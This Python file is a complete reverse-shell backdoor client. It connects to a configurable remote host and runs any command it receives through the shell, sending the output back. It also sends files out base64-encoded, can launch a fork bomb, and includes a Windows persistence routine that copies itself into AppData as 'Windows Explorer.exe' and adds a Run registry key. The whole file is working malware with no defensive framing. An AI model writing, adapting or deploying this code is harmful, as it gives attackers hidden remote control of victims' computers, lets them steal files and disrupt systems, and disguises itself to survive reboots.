import socket
import subprocess
import os
import platform
import colorama
from colorama import Fore, Style
from time import sleep
import getpass
import base64
import shutil
import sys

colorama.init()

RHOST = "127.0.0.1"
RPORT = 8080

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST,RPORT))

def Persist(): #Work just for Windows Systems
    location = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"', shell=True)

while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        command = sock.recv(1024).decode("utf-8")
        #Persist() 
        
        if command == "list":
            sock.send(str(os.listdir(".")).encode())
        
        elif command == "forkbomb":
            while True:
                os.fork()
        
        elif command.split(" ")[0] == "cd":
            os.chdir(command.split(" ")[1])
            sock.send("[+] Directory : {}".format(os.getcwd()).encode())


        elif command.split(" ")[0] == "download":
            with open(command.split(" ")[1],"rb") as f:
                file = base64.b64encode(f.read())
                while file:
                    #print("[!] Sending Data...")
                    sock.send(file)
                    file = f.read()
                sleep(2)
                sock.send(b"[+] Done!")
            print("[+] Finished sending data!")

        elif command == "exit":
            sock.send(b"exit")
            break

        else:
            comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        if not command:
            print("[X] Connection Drooped!")
            break

    except Exception as e:
        sock.send("Error : {}".format(str(e)).encode())

sock.close()
            
